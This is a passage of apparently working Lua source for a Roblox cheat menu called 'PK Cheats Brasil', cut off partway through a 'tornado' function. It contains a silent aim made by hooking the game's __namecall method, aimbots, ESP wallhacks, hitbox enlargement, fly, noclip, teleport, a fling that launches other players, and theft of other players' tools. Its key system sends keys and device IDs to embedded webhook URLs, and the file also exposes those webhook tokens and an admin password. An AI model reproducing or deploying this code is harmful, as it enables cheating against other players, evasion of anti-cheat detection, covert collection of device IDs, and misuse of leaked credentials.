-- PK Cheats Brasil v8 :: discord.gg/bad7
-- K / Insert / End = menu | F1 fly | F2 speed | F3 tp | F4 stream

local WH_KEYS="https://webhook.lewisakura.moe/api/webhooks/1567405397407440926/jh-HT55fohZYWjDJq4qunVdyQEUvnUOm58SYa6lNPEIeNZSGufpdiWDI1utmLeYcAsac"
local WH_STATUS="https://webhook.lewisakura.moe/api/webhooks/1567427417948033074/qgX3IXyzajz1PIMXsUmVereVhFgW9NDgx3EB-N7tkzYB-fqeFAuOt-UMbStoibp5dgqP"
local ADMIN_USER,ADMIN_PASS="bad7","1986rkrk"
local DISCORD,BRAND="discord.gg/bad7","PK Cheats Brasil"
local LOGO_ID="rbxassetid://93685935272917"
local TAB_ICON="rbxassetid://98211971158539" -- ícone pra todas as abas menos Início
local HOME_ICON="rbxassetid://10709791437"

local THEME={bg=Color3.fromRGB(10,10,12),bg2=Color3.fromRGB(18,18,22),card=Color3.fromRGB(24,24,28),card2=Color3.fromRGB(32,32,36),accent=Color3.fromRGB(220,38,38),accent2=Color3.fromRGB(170,20,20),accent3=Color3.fromRGB(120,10,10),text=Color3.fromRGB(240,240,240),text2=Color3.fromRGB(145,145,150),good=Color3.fromRGB(45,200,95),warn=Color3.fromRGB(255,180,40),danger=Color3.fromRGB(255,60,60),stroke=Color3.fromRGB(38,38,44)}

local DURATIONS={{label="6 horas",seconds=6*3600},{label="24 horas",seconds=24*3600},{label="3 dias",seconds=3*86400},{label="7 dias",seconds=7*86400},{label="1 mes",seconds=30*86400},{label="1 ano",seconds=365*86400},{label="lifetime",seconds=-1}}

local Players=game:GetService("Players"); local RunService=game:GetService("RunService"); local UserInput=game:GetService("UserInputService"); local TweenService=game:GetService("TweenService"); local HttpService=game:GetService("HttpService"); local Workspace=game:GetService("Workspace"); local Teams=game:GetService("Teams"); local RepStorage=game:GetService("ReplicatedStorage"); local Lighting=game:GetService("Lighting"); local VirtualUser=game:GetService("VirtualUser"); local TeleportService=game:GetService("TeleportService")
local LP=Players.LocalPlayer; local Camera=Workspace.CurrentCamera
local IS_MOBILE=UserInput.TouchEnabled and not UserInput.KeyboardEnabled

local HWID="unknown"; pcall(function() if gethwid then HWID=gethwid() end end); if HWID=="unknown" then pcall(function() HWID=game:GetService("RbxAnalyticsService"):GetClientId() end) end; HWID=tostring(HWID)
local EXE="unknown"; pcall(function() if identifyexecutor then EXE=identifyexecutor() end end)

local FS_OK=type(writefile)=="function" and type(readfile)=="function" and type(isfile)=="function" and type(makefolder)=="function"
if FS_OK then pcall(function() makefolder("PKCheats") end) end
local function fs_read(p,f) if not FS_OK or not isfile(p) then return f end local ok,v=pcall(readfile,p); return ok and v or f end
local function fs_write(p,d) if FS_OK then pcall(writefile,p,d) end end
local function load_json(p,d) local r=fs_read(p,nil); if not r then return d end local ok,v=pcall(HttpService.JSONDecode,HttpService,r); return ok and v or d end
local function save_json(p,t) local ok,v=pcall(HttpService.JSONEncode,HttpService,t); if ok then fs_write(p,v) end end

local P_KEYS,P_USERS,P_SESS,P_CFG="PKCheats/keys.json","PKCheats/users.json","PKCheats/session.json","PKCheats/cfg.json"
local KeyDB=load_json(P_KEYS,{}); local UserDB=load_json(P_USERS,{})
UserDB[ADMIN_USER]=UserDB[ADMIN_USER] or {pass=ADMIN_PASS,admin=true,key="LIFETIME-ADMIN",exp=-1,hwid=HWID,created=os.time()}
UserDB[ADMIN_USER].admin=true; UserDB[ADMIN_USER].hwid=HWID; save_json(P_USERS,UserDB)
local Session=load_json(P_SESS,{user=nil})
local CfgDB=load_json(P_CFG,{accent={220,38,38},transparency=0.12,aim_whitelist={}})
THEME.accent=Color3.fromRGB(table.unpack(CfgDB.accent))

-- WEBHOOK (robusto, roda em thread com triple pcall)
local function http_send_safe(url, body)
    task.spawn(function()
        local req = http_request or (syn and syn.request) or request or (fluxus and fluxus.request)
        local ok1 = pcall(function()
            if req then
                pcall(function() req({Url=url, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body}) end)
            else
                pcall(function() HttpService:PostAsync(url, body, Enum.HttpContentType.ApplicationJson) end)
            end
        end)
    end)
end

local function send_webhook(url, embed_tbl)
    local payload = { username = BRAND, embeds = { embed_tbl } }
    local ok, body = pcall(HttpService.JSONEncode, HttpService, payload)
    if ok then http_send_safe(url, body) end
end

-- KEY SYSTEM
local CHARS="ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
local function gen_key() local t={"PK"}; for i=1,4 do local b={}; for j=1,4 do local n=math.random(1,#CHARS); table.insert(b,CHARS:sub(n,n)) end; table.insert(t,table.concat(b)) end; return table.concat(t,"-") end

local function generate_keys(sec, lbl, qty, who)
    local out={}
    for i=1,qty do
        local k; repeat k=gen_key() until not KeyDB[k]
        KeyDB[k] = { duration=sec, created=os.time(), used_by=nil, redeemed_at=nil, generated_by=who }
        table.insert(out, k)
    end
    save_json(P_KEYS, KeyDB)
    -- WEBHOOK de key gerada
    send_webhook(WH_KEYS, {
        title = "🔑 KEYS GERADAS",
        color = 14362437,
        fields = {
            { name="Quantidade", value="`"..qty.."`", inline=true },
            { name="Duração", value="`"..lbl.."`", inline=true },
            { name="Gerado por", value="`"..who.."`", inline=true },
            { name="Keys", value="```\n"..table.concat(out,"\n").."\n```", inline=false },
        },
        footer = { text = BRAND.." • "..DISCORD },
        timestamp = DateTime.now():ToIsoDate(),
    })
    return out
end

local function redeem_key(user, key)
    local rec = KeyDB[key]
    if not rec then return false, "key inexistente" end
    if rec.used_by and rec.used_by ~= user then return false, "key ja usada" end
    rec.used_by = user; rec.redeemed_at = rec.redeemed_at or os.time()
    local exp = rec.duration == -1 and -1 or (rec.redeemed_at + rec.duration)
    UserDB[user].key = key; UserDB[user].exp = exp; UserDB[user].hwid = HWID
    save_json(P_KEYS, KeyDB); save_json(P_USERS, UserDB)
    -- WEBHOOK de key resgatada (contém quem gerou + quem resgatou — mesmo embed)
    send_webhook(WH_KEYS, {
        title = "✅ KEY RESGATADA",
        color = 3066993,
        fields = {
            { name="Key", value="`"..key.."`", inline=false },
            { name="Resgatada por", value="`"..user.."`", inline=true },
            { name="Gerada por", value="`"..(rec.generated_by or "?").."`", inline=true },
            { name="Duração", value="`"..(rec.duration==-1 and "LIFETIME" or (rec.duration/3600).."h").."`", inline=true },
            { name="Expira", value="`"..(exp==-1 and "nunca" or os.date("%d/%m/%Y %H:%M", exp)).."`", inline=false },
            { name="HWID", value="`"..HWID:sub(1,20).."...`", inline=false },
        },
        footer = { text = BRAND.." • "..DISCORD },
        timestamp = DateTime.now():ToIsoDate(),
    })
    return true, exp
end

local function key_active(u) local v=UserDB[u]; if not v or not v.key then return false,"NO_KEY" end; if v.hwid and v.hwid~=HWID then return false,"HWID_MISMATCH" end; if v.exp==-1 then return true end; if os.time()>=(v.exp or 0) then return false,"EXPIRED" end; return true end
local function delete_expired(u) if UserDB[u] and not UserDB[u].admin then local k=UserDB[u].key; UserDB[u]=nil; if k and KeyDB[k] then KeyDB[k]=nil end; save_json(P_USERS,UserDB); save_json(P_KEYS,KeyDB) end end
local function admin_reset_hwid(t) local u=UserDB[t]; if not u then return false,"nao existe" end; u.hwid=nil; save_json(P_USERS,UserDB); return true end

-- UI
local function make(c,p,par) local o=Instance.new(c); for k,v in pairs(p or {}) do o[k]=v end; if par then o.Parent=par end; return o end
local function corner(o,r) make("UICorner",{CornerRadius=UDim.new(0,r or 6)},o) end
local function stroke(o,c,t) local s=make("UIStroke",{Color=c or THEME.stroke,Thickness=t or 1},o); s.ApplyStrokeMode=Enum.ApplyStrokeMode.Border; return s end
local function pad(o,p) make("UIPadding",{PaddingTop=UDim.new(0,p),PaddingBottom=UDim.new(0,p),PaddingLeft=UDim.new(0,p),PaddingRight=UDim.new(0,p)},o) end
local function gradient_pro(o,c1,c2,c3,r) return make("UIGradient",{Color=ColorSequence.new({ColorSequenceKeypoint.new(0,c1),ColorSequenceKeypoint.new(0.5,c2 or c1:Lerp(c3 or c1,0.5)),ColorSequenceKeypoint.new(1,c3 or c2 or c1)}),Rotation=r or 90},o) end
local function label(p,t,s,b,c) return make("TextLabel",{BackgroundTransparency=1,Text=t,TextColor3=c or THEME.text,Font=b and Enum.Font.GothamBold or Enum.Font.Gotham,TextSize=s or 13,TextXAlignment=Enum.TextXAlignment.Left,Parent=p}) end
local function imgIcon(p,i,s) return make("ImageLabel",{BackgroundTransparency=1,Image=i,Size=UDim2.new(0,s or 18,0,s or 18),ImageColor3=THEME.text,Parent=p}) end
local function animate_btn(b) local o=b.BackgroundColor3; b.MouseEnter:Connect(function() TweenService:Create(b,TweenInfo.new(0.15),{BackgroundColor3=o:Lerp(Color3.new(1,1,1),0.12)}):Play() end); b.MouseLeave:Connect(function() TweenService:Create(b,TweenInfo.new(0.15),{BackgroundColor3=o}):Play() end) end
local function build_logo(p,s) return make("ImageLabel",{BackgroundTransparency=1,Image=LOGO_ID,Size=UDim2.new(0,s,0,s),ScaleType=Enum.ScaleType.Fit,Parent=p}) end

local function root_parent() if gethui then local ok,g=pcall(gethui); if ok then return g end end; local ok,cg=pcall(function() return game:GetService("CoreGui") end); if ok and cg then return cg end; return LP:WaitForChild("PlayerGui") end
local SG_NAME="\0"..tostring(math.random(1e8,9e8))
local ScreenGui=make("ScreenGui",{Name=SG_NAME,ResetOnSpawn=false,ZIndexBehavior=Enum.ZIndexBehavior.Sibling,IgnoreGuiInset=true,DisplayOrder=9999})
pcall(function() if syn and syn.protect_gui then syn.protect_gui(ScreenGui) end end)
pcall(function() if protect_gui then protect_gui(ScreenGui) end end)
ScreenGui.Parent=root_parent()

local StreamOn=false; local function apply_stream() ScreenGui.Enabled=not StreamOn end
local Connections={}; local function track(c) table.insert(Connections,c); return c end

local NH=make("Frame",{Size=UDim2.new(0,340,1,-40),Position=UDim2.new(1,-356,0,20),BackgroundTransparency=1,Parent=ScreenGui})
make("UIListLayout",{Padding=UDim.new(0,8),HorizontalAlignment=Enum.HorizontalAlignment.Right,SortOrder=Enum.SortOrder.LayoutOrder},NH)
local nC=0
local function notify(t,m,k,d) nC+=1; local c=k=="success" and THEME.good or k=="warn" and THEME.warn or k=="error" and THEME.danger or THEME.accent; local n=make("Frame",{LayoutOrder=-nC,Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,BackgroundColor3=THEME.bg2,BorderSizePixel=0,Parent=NH,Position=UDim2.new(1,40,0,0)}); corner(n,8); stroke(n,THEME.stroke); make("Frame",{Size=UDim2.new(0,4,1,0),BackgroundColor3=c,BorderSizePixel=0,Parent=n}); local b=make("Frame",{Size=UDim2.new(1,-20,0,0),Position=UDim2.new(0,14,0,0),AutomaticSize=Enum.AutomaticSize.Y,BackgroundTransparency=1,Parent=n}); pad(b,10); make("UIListLayout",{Padding=UDim.new(0,4)},b); local tl=label(b,t,13,true,c); tl.Size=UDim2.new(1,0,0,16); local ml=label(b,m,12,false,THEME.text); ml.Size=UDim2.new(1,0,0,0); ml.AutomaticSize=Enum.AutomaticSize.Y; ml.TextWrapped=true; TweenService:Create(n,TweenInfo.new(0.35,Enum.EasingStyle.Quint),{Position=UDim2.new(0,0,0,0)}):Play(); task.delay(d or 4,function() local tw=TweenService:Create(n,TweenInfo.new(0.3),{Position=UDim2.new(1,40,0,0),BackgroundTransparency=1}); tw:Play(); tw.Completed:Connect(function() n:Destroy() end) end) end

-- SPLASH
local Splash=make("Frame",{Size=UDim2.new(1,0,1,0),BackgroundColor3=THEME.bg,BorderSizePixel=0,Parent=ScreenGui,ZIndex=1000})
gradient_pro(Splash,THEME.bg,THEME.bg2,THEME.bg,90)
local sL=build_logo(Splash,220); sL.Position=UDim2.new(0.5,-110,0.5,-160)
local sT=label(Splash,"carregando...",14,false,THEME.text2); sT.Size=UDim2.new(0,300,0,20); sT.Position=UDim2.new(0.5,-150,0.5,100); sT.TextXAlignment=Enum.TextXAlignment.Center
local sBg=make("Frame",{Size=UDim2.new(0,300,0,4),Position=UDim2.new(0.5,-150,0.5,130),BackgroundColor3=THEME.card,BorderSizePixel=0,Parent=Splash}); corner(sBg,2)
local sBar=make("Frame",{Size=UDim2.new(0,0,1,0),BackgroundColor3=THEME.accent,BorderSizePixel=0,Parent=sBg}); corner(sBar,2); gradient_pro(sBar,THEME.accent,THEME.accent2,THEME.accent3,0)
local function run_splash(cb) task.spawn(function() for i=1,5 do sT.Text=({"verificando executor...","carregando módulos...","conectando backend...","aplicando anti-trace...","pronto!"})[i]; TweenService:Create(sBar,TweenInfo.new(1,Enum.EasingStyle.Quint),{Size=UDim2.new(i/5,0,1,0)}):Play(); task.wait(1) end; task.wait(0.3); local tw=TweenService:Create(Splash,TweenInfo.new(0.5),{BackgroundTransparency=1}); tw:Play(); tw.Completed:Connect(function() Splash:Destroy(); cb() end) end) end

local S={esp={on=false,box=true,name=true,hp=true,tracer=false,team=false,chams=false,team_check=true,max_dist=2000},fly={on=false,speed=60},speed={on=false,value=50},jump={on=false,value=80},noclip={on=false},inf_jump={on=false},anti_afk={on=false},fullbright={on=false},zoom={on=false,value=120},hitbox={on=false,size=10},freecam={on=false,speed=1},crosshair={on=false},click_tp={on=false},no_recoil={on=false},tornado={on=false},tp={target=""},aim={on=false,lock=false,silent=false,fov=120,smooth=0.3,team_check=true,visible_only=false,show_fov=true,mobile=false},troll={follow_target="",god=false,invisible=false,spin=false,big=false}}

local function in_wl(n) for _,x in ipairs(CfgDB.aim_whitelist) do if x==n then return true end end; return false end

-- NEAREST HEAD
local function get_nearest_head(use_fov, lock_mode) local best,bd=nil,(use_fov and S.aim.fov or math.huge); if lock_mode then bd=math.huge end; local mx,my=Camera.ViewportSize.X/2,Camera.ViewportSize.Y/2; for _,plr in ipairs(Players:GetPlayers()) do if plr==LP then continue end; if S.aim.team_check and plr.Team==LP.Team then continue end; if in_wl(plr.Name) then continue end; local ch=plr.Character; local head=ch and ch:FindFirstChild("Head"); local h=ch and ch:FindFirstChildOfClass("Humanoid"); if not head or not h or h.Health<=0 then continue end; local vp,on=Camera:WorldToViewportPoint(head.Position); if not on then continue end; local d=math.sqrt((vp.X-mx)^2+(vp.Y-my)^2); if d<bd then if lock_mode or S.aim.visible_only then local r=Workspace:Raycast(Camera.CFrame.Position,head.Position-Camera.CFrame.Position); if r and not r.Instance:IsDescendantOf(ch) then continue end end; best,bd=head,d end end; return best end

-- Silent aim (hook)
if hookmetamethod then local old; old=hookmetamethod(game,"__namecall",function(self,...) local m=getnamecallmethod(); local args={...}; if S.aim.silent and not checkcaller() then local head=get_nearest_head(true); if head then if m=="FindPartOnRayWithIgnoreList" or m=="FindPartOnRay" then local o=Camera.CFrame.Position; args[1]=Ray.new(o,(head.Position-o).Unit*1000); return old(self,table.unpack(args)) elseif m=="Raycast" and typeof(args[1])=="Vector3" and typeof(args[2])=="Vector3" then local o=args[1]; local mag=args[2].Magnitude>0 and args[2].Magnitude or 1000; args[2]=(head.Position-o).Unit*mag; return old(self,table.unpack(args)) end end end; return old(self,...) end) end

-- AIMBOT 1 (configurável) + MOBILE
local hasMR=type(mousemoverel)=="function"
local function aim_trigger_pressed()
    if UserInput:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then return true end
    -- mobile: detecta se há touch ativo (usuario mirando com arma no botão de tiro)
    if S.aim.mobile and IS_MOBILE then
        for _,t in ipairs(UserInput:GetMouseButtonsPressed()) do
            if t.UserInputType == Enum.UserInputType.Touch then return true end
        end
        -- fallback: qualquer touch na tela
        local touches = UserInput:GetTouches and UserInput:GetTouches() or {}
        if #touches > 0 then return true end
    end
    return false
end

track(RunService.RenderStepped:Connect(function()
    if not S.aim.on then return end
    if not aim_trigger_pressed() then return end
    local head = get_nearest_head(true)
    if not head then return end
    if hasMR and not IS_MOBILE then
        local vp=Camera:WorldToViewportPoint(head.Position); local mx,my=Camera.ViewportSize.X/2,Camera.ViewportSize.Y/2
        pcall(mousemoverel,(vp.X-mx)*S.aim.smooth,(vp.Y-my)*S.aim.smooth)
    else
        -- mobile ou sem mousemoverel: usa CFrame direto
        local cur=Camera.CFrame
        Camera.CFrame = cur:Lerp(CFrame.lookAt(cur.Position, head.Position), math.clamp(S.aim.smooth*2, 0.1, 1))
    end
end))

-- AIMBOT 2: LOCK-ON (não configurável, sempre gruda, só visíveis)
track(RunService.RenderStepped:Connect(function()
    if not S.aim.lock then return end
    if not aim_trigger_pressed() then return end
    local head = get_nearest_head(false, true) -- lock_mode = ignora FOV, exige visível
    if not head then return end
    Camera.CFrame = CFrame.lookAt(Camera.CFrame.Position, head.Position)
end))

local fovCircle; if type(Drawing)=="table" and Drawing.new then fovCircle=Drawing.new("Circle"); fovCircle.Thickness=1.3; fovCircle.NumSides=60; fovCircle.Color=THEME.accent; fovCircle.Filled=false; fovCircle.Transparency=1; fovCircle.Visible=false end
track(RunService.RenderStepped:Connect(function() if not fovCircle then return end; if S.aim.on and S.aim.show_fov then fovCircle.Radius=S.aim.fov; fovCircle.Position=Vector2.new(Camera.ViewportSize.X/2,Camera.ViewportSize.Y/2); fovCircle.Visible=true else fovCircle.Visible=false end end))

-- CROSSHAIR
local chLines={}; if type(Drawing)=="table" and Drawing.new then for i=1,4 do local l=Drawing.new("Line"); l.Thickness=1.5; l.Color=THEME.accent; l.Visible=false; table.insert(chLines,l) end end
track(RunService.RenderStepped:Connect(function() if #chLines==0 then return end; local cx,cy=Camera.ViewportSize.X/2,Camera.ViewportSize.Y/2; for _,l in ipairs(chLines) do l.Visible=S.crosshair.on end; if S.crosshair.on then local g,ln=5,8; chLines[1].From=Vector2.new(cx,cy-g-ln); chLines[1].To=Vector2.new(cx,cy-g); chLines[2].From=Vector2.new(cx,cy+g); chLines[2].To=Vector2.new(cx,cy+g+ln); chLines[3].From=Vector2.new(cx-g-ln,cy); chLines[3].To=Vector2.new(cx-g,cy); chLines[4].From=Vector2.new(cx+g,cy); chLines[4].To=Vector2.new(cx+g+ln,cy) end end))

-- NO RECOIL
local lastLook=Camera.CFrame.LookVector; local recoilCD=0
track(RunService.RenderStepped:Connect(function() if not S.no_recoil.on then lastLook=Camera.CFrame.LookVector; return end; local cur=Camera.CFrame.LookVector; if lastLook:Dot(cur)<0.9995 and tick()>recoilCD then local vD=cur.Y-lastLook.Y; if math.abs(vD)>0.003 then Camera.CFrame=Camera.CFrame*CFrame.Angles(math.asin(vD*0.85),0,0); recoilCD=tick()+0.02 end end; lastLook=Camera.CFrame.LookVector end))

-- ESP
local USE_DRAW=type(Drawing)=="table" and Drawing.new
local ESPData={}
local function new_esp(plr) if ESPData[plr] then return end; local e={}; if USE_DRAW then e.box=Drawing.new("Square"); e.box.Thickness=1.5; e.box.Filled=false; e.box.Color=THEME.accent; e.box.Visible=false; e.name=Drawing.new("Text"); e.name.Size=14; e.name.Center=true; e.name.Outline=true; e.name.Color=THEME.text; e.name.Font=2; e.name.Visible=false; e.hp_bg=Drawing.new("Square"); e.hp_bg.Thickness=1; e.hp_bg.Filled=true; e.hp_bg.Color=Color3.fromRGB(0,0,0); e.hp_bg.Visible=false; e.hp_fg=Drawing.new("Square"); e.hp_fg.Thickness=1; e.hp_fg.Filled=true; e.hp_fg.Color=THEME.good; e.hp_fg.Visible=false; e.tracer=Drawing.new("Line"); e.tracer.Thickness=1.2; e.tracer.Color=THEME.accent; e.tracer.Visible=false end; e.chams=make("Highlight",{FillColor=THEME.accent,FillTransparency=0.7,OutlineColor=THEME.text,OutlineTransparency=0,Enabled=false,DepthMode=Enum.HighlightDepthMode.AlwaysOnTop,Parent=ScreenGui}); ESPData[plr]=e end
local function kill_esp(plr) local e=ESPData[plr]; if not e then return end; if e.box then for _,d in pairs({e.box,e.name,e.hp_bg,e.hp_fg,e.tracer}) do pcall(function() d:Remove() end) end end; if e.chams then e.chams:Destroy() end; ESPData[plr]=nil end
track(RunService.RenderStepped:Connect(function() for _,plr in ipairs(Players:GetPlayers()) do if plr==LP then continue end; new_esp(plr); local e=ESPData[plr]; local ch=plr.Character; local root=ch and ch:FindFirstChild("HumanoidRootPart"); local head=ch and ch:FindFirstChild("Head"); local h=ch and ch:FindFirstChildOfClass("Humanoid"); local alive=S.esp.on and root and head and h and h.Health>0; if S.esp.team_check and plr.Team==LP.Team then alive=false end; local me_root=LP.Character and LP.Character:FindFirstChild("HumanoidRootPart"); local dist=(alive and me_root) and (me_root.Position-root.Position).Magnitude or 999999; if alive and dist>S.esp.max_dist then alive=false end; if e.chams then e.chams.Adornee=(alive and S.esp.chams) and ch or nil; e.chams.Enabled=alive and S.esp.chams or false end; if not e.box then continue end; if not alive then for _,d in pairs({e.box,e.name,e.hp_bg,e.hp_fg,e.tracer}) do d.Visible=false end else local vp_r,vis=Camera:WorldToViewportPoint(root.Position); local vp_h=Camera:WorldToViewportPoint(head.Position+Vector3.new(0,0.6,0)); if not vis then for _,d in pairs({e.box,e.name,e.hp_bg,e.hp_fg,e.tracer}) do d.Visible=false end else local height=(vp_r.Y-vp_h.Y)*2; local width=height*0.45; local x,y=vp_r.X-width/2,vp_h.Y; local col=S.esp.team and plr.TeamColor and plr.TeamColor.Color or THEME.accent; e.box.Size=Vector2.new(width,height); e.box.Position=Vector2.new(x,y); e.box.Color=col; e.box.Visible=S.esp.box; e.name.Text=plr.Name.." ["..math.floor(dist).."m]"; e.name.Position=Vector2.new(vp_r.X,y-16); e.name.Visible=S.esp.name; if S.esp.hp then local frac=math.clamp(h.Health/h.MaxHealth,0,1); local bx=x-6; e.hp_bg.Size=Vector2.new(3,height); e.hp_bg.Position=Vector2.new(bx,y); e.hp_bg.Visible=true; e.hp_fg.Size=Vector2.new(3,height*frac); e.hp_fg.Position=Vector2.new(bx,y+height*(1-frac)); e.hp_fg.Color=Color3.fromRGB(math.floor(255*(1-frac)),math.floor(255*frac),40); e.hp_fg.Visible=true else e.hp_bg.Visible=false; e.hp_fg.Visible=false end; if S.esp.tracer then e.tracer.From=Vector2.new(Camera.ViewportSize.X/2,Camera.ViewportSize.Y); e.tracer.To=Vector2.new(vp_r.X,vp_r.Y+height/2); e.tracer.Color=col; e.tracer.Visible=true else e.tracer.Visible=false end end end end end))
track(Players.PlayerRemoving:Connect(kill_esp))

-- MOVE
local function hrp() local c=LP.Character; return c and c:FindFirstChild("HumanoidRootPart") end
local function hum() local c=LP.Character; return c and c:FindFirstChildOfClass("Humanoid") end
local bg,bv
local function stop_fly() if bg then bg:Destroy(); bg=nil end; if bv then bv:Destroy(); bv=nil end end
local function start_fly() stop_fly(); local r=hrp(); if not r then return end; bg=Instance.new("BodyGyro",r); bg.Name="_"; bg.P=9e4; bg.MaxTorque=Vector3.new(9e9,9e9,9e9); bg.CFrame=r.CFrame; bv=Instance.new("BodyVelocity",r); bv.Name="_"; bv.MaxForce=Vector3.new(9e9,9e9,9e9); bv.Velocity=Vector3.zero end
track(RunService.Heartbeat:Connect(function() if S.fly.on and bg and bv then bg.CFrame=Camera.CFrame; local mv=Vector3.zero; if UserInput:IsKeyDown(Enum.KeyCode.W) then mv+=Camera.CFrame.LookVector end; if UserInput:IsKeyDown(Enum.KeyCode.S) then mv-=Camera.CFrame.LookVector end; if UserInput:IsKeyDown(Enum.KeyCode.D) then mv+=Camera.CFrame.RightVector end; if UserInput:IsKeyDown(Enum.KeyCode.A) then mv-=Camera.CFrame.RightVector end; if UserInput:IsKeyDown(Enum.KeyCode.Space) then mv+=Vector3.new(0,1,0) end; if UserInput:IsKeyDown(Enum.KeyCode.Q) then mv-=Vector3.new(0,1,0) end; if mv.Magnitude>0 then mv=mv.Unit*S.fly.speed end; bv.Velocity=mv end; if S.speed.on then local h=hum(); if h and h.WalkSpeed~=S.speed.value then h.WalkSpeed=S.speed.value end end; if S.jump.on then local h=hum(); if h and h.JumpPower~=S.jump.value then h.JumpPower=S.jump.value end end; if S.hitbox.on then for _,p in ipairs(Players:GetPlayers()) do if p~=LP then local r=p.Character and p.Character:FindFirstChild("HumanoidRootPart"); if r then r.Size=Vector3.new(S.hitbox.size,S.hitbox.size,S.hitbox.size); r.Transparency=0.7; r.CanCollide=false end end end end end))
track(RunService.Stepped:Connect(function() if S.noclip.on then local c=LP.Character; if c then for _,p in ipairs(c:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide=false end end end end end))
track(UserInput.JumpRequest:Connect(function() if S.inf_jump.on then local h=hum(); if h then h:ChangeState(Enum.HumanoidStateType.Jumping) end end end))

local origL={Ambient=Lighting.Ambient,OutdoorAmbient=Lighting.OutdoorAmbient,FogEnd=Lighting.FogEnd,Brightness=Lighting.Brightness}
local function apply_fullbright(v) if v then Lighting.Ambient=Color3.fromRGB(255,255,255); Lighting.OutdoorAmbient=Color3.fromRGB(255,255,255); Lighting.FogEnd=1e6; Lighting.Brightness=3 else Lighting.Ambient=origL.Ambient; Lighting.OutdoorAmbient=origL.OutdoorAmbient; Lighting.FogEnd=origL.FogEnd; Lighting.Brightness=origL.Brightness end end
track(RunService.RenderStepped:Connect(function() if S.zoom.on then Camera.FieldOfView=S.zoom.value end end))
track(LP.Idled:Connect(function() if S.anti_afk.on then pcall(function() VirtualUser:CaptureController(); VirtualUser:ClickButton2(Vector2.new()) end) end end))

local fc_cf,fc_type
local function toggle_freecam(v) S.freecam.on=v; if v then fc_type=Camera.CameraType; Camera.CameraType=Enum.CameraType.Scriptable; fc_cf=Camera.CFrame else if fc_type then Camera.CameraType=fc_type end; fc_cf=nil end end
track(RunService.RenderStepped:Connect(function(dt) if not S.freecam.on or not fc_cf then return end; local mv=Vector3.zero; if UserInput:IsKeyDown(Enum.KeyCode.W) then mv+=fc_cf.LookVector end; if UserInput:IsKeyDown(Enum.KeyCode.S) then mv-=fc_cf.LookVector end; if UserInput:IsKeyDown(Enum.KeyCode.D) then mv+=fc_cf.RightVector end; if UserInput:IsKeyDown(Enum.KeyCode.A) then mv-=fc_cf.RightVector end; if UserInput:IsKeyDown(Enum.KeyCode.E) then mv+=Vector3.new(0,1,0) end; if UserInput:IsKeyDown(Enum.KeyCode.Q) then mv-=Vector3.new(0,1,0) end; fc_cf=fc_cf+mv*S.freecam.speed*50*dt; Camera.CFrame=fc_cf end))

track(UserInput.InputBegan:Connect(function(input,gpe) if not S.click_tp.on or gpe then return end; if input.UserInputType~=Enum.UserInputType.MouseButton1 then return end; local m=LP:GetMouse(); if m.Hit then local r=hrp(); if r then r.CFrame=CFrame.new(m.Hit.Position+Vector3.new(0,3,0)) end end end))

local function tp_to(cf) local r=hrp(); if r then r.CFrame=cf end end
local function tp_player(name) for _,p in ipairs(Players:GetPlayers()) do if p~=LP and p.Name:lower():find(name:lower(),1,true) then local r=p.Character and p.Character:FindFirstChild("HumanoidRootPart"); if r then tp_to(r.CFrame+Vector3.new(2,0,0)); notify("TP","teleportou pra "..p.Name,"success",2) end; return end end; notify("TP","não encontrado","error") end

local function scan_tools() local out={}; local roots={RepStorage,Workspace}; for _,t in ipairs(Teams:GetChildren()) do table.insert(roots,t) end; for _,p in ipairs(Players:GetPlayers()) do if p.Backpack then table.insert(roots,p.Backpack) end end; for _,root in ipairs(roots) do for _,d in ipairs(root:GetDescendants()) do if d:IsA("Tool") then table.insert(out,d) end end end; return out end
local function grab(t) local bp=LP:FindFirstChildOfClass("Backpack"); if bp and t.Parent~=bp then pcall(function() t.Parent=bp end) end end

------------------------------------------------------------
-- TROLLS (populadas de verdade)
------------------------------------------------------------
-- Fling Player (outro player)
local function fling_player(name)
    for _,p in ipairs(Players:GetPlayers()) do
        if p~=LP and p.Name:lower():find(name:lower(),1,true) then
            local ch = p.Character; local r = ch and ch:FindFirstChild("HumanoidRootPart")
            if not r then notify("Fling","player sem personagem","error"); return end
            -- técnica: tp em volta do alvo com velocity extrema (funciona em jogos sem anti-fling)
            task.spawn(function()
                local myR = hrp(); if not myR then return end
                local origCF = myR.CFrame
                for i=1,8 do
                    myR.Velocity = Vector3.new(math.random(-9999,9999), 9999, math.random(-9999,9999))
                    myR.RotVelocity = Vector3.new(math.random(-9999,9999),math.random(-9999,9999),math.random(-9999,9999))
                    myR.CFrame = r.CFrame
                    task.wait()
                end
                myR.CFrame = origCF
            end)
            notify("Fling","alvo "..p.Name.." arremessado","success",3)
            return
        end
    end
    notify("Fling","player não encontrado","error")
end

-- Tiny Player (seu personagem minúsculo)
local function tiny_player(v)
    local c = LP.Character; if not c then return end
    local scale = v and 0.3 or 1
    for _,obj in ipairs(c:GetDescendants()) do
        if obj:IsA("NumberValue") and (obj.Name=="BodyHeightScale" or obj.Name=="BodyWidthScale" or obj.Name=="BodyDepthScale" or obj.Name=="HeadScale") then
            obj.Value = scale
        end
    end
    -- fallback pra R6: mexe no Mesh
    for _,p in ipairs(c:GetDescendants()) do
        if p:IsA("BasePart") then p.Size = p.Size * (v and 0.3 or 1/0.3) end
    end
end

-- Giant Player
local function giant_player(v)
    local c = LP.Character; if not c then return end
    local scale = v and 3 or 1
    for _,obj in ipairs(c:GetDescendants()) do
        if obj:IsA("NumberValue") and (obj.Name=="BodyHeightScale" or obj.Name=="BodyWidthScale" or obj.Name=="BodyDepthScale" or obj.Name=="HeadScale") then
            obj.Value = scale
        end
    end
    for _,p in ipairs(c:GetDescendants()) do
        if p:IsA("BasePart") then p.Size = p.Size * (v and 3 or 1/3) end
    end
end

-- Tornado Mode (objetos girando ao redor)
local tornadoConn; local tornadoParts = {}
local function toggle_tornado(v)
    if tornadoConn then tornadoConn:Disconnect(); tornadoConn=nil end
    tornadoParts = {}
    if not v then return end
    -- cria 20 partes orbitando
    for i=1,20 do
        local p = Instance.new("Part")
        p.Size = Vector3.new(2,2,2); p.Material=Enum.Material.Neon; p.Color=THEME.accent
        p.Anchored=true; p.CanCollide=false; p.Transparency=0.3
        p.Parent = Workspace
        table.insert(tornadoParts, { part=p, angle=math.rad(i*18), radius=8+i*0.3, height=i*1.5 })
    end
